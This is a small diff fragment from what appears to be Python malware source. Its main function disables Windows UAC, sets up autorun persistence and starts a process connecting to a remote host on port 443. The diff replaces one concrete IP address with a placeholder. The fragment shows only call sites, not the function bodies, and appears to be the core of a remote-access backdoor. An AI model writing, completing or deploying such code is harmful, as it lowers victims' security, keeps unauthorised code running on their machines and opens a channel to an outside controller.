@@ -151,7 +151,7 @@ def main():
 		Disable_UAC()
 		AUTORUN_configuration()
 
-		process1 = Process( target = check_connection, args=("185.65.200.96", 443) )
+		process1 = Process( target = check_connection, args=("111.111.111.111", 443) )
 
 		process1.start()
 
